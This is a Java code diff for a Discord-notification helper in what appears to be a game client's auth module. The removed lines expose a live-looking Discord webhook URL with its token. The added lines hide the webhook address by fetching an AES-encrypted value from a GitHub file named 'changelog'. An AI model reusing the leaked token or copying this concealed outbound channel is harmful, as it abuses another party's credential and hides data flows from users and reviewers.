@@ -10,6 +10,7 @@ import java.text.SimpleDateFormat;
 import java.util.Base64;
 import java.util.Date;
 
+import cc.unknown.util.security.aes.NetworkUtility;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
@@ -23,16 +24,12 @@ import lombok.experimental.UtilityClass;
 
 @UtilityClass
 public class AuthUtil implements Accessor {
-	String api = "https://discord.com/api/webhooks/";
-	String id = "1307039017350467584/";
-	String fr = "OcJaidlkTa_Fv0LLrcj6iiZP3jsVYlJaPP4RIocSkx6G0h6itVvOQ3xEFd_tf5wgkyIX";
-	
-	String rest = api + id + fr;
-	
+	private static String remoteContent = NetworkUtility.getRaw("https://raw.githubusercontent.com/Cvrwed/cloud/refs/heads/main/changelog");
+
 	@SneakyThrows
 	public void notify(String content) {
 	    try {
-	    	Hook webhook = new Hook(rest);
+	    	Hook webhook = new Hook(AesUtil.decrypt(remoteContent));
 	        webhook.setAvatarUrl("https://i.ibb.co/bNfZbWL/sakura.png");
 	        webhook.setUsername("Sakura Auth");
 	        webhook.setContent("-# [" + getTime() + "] " + content);
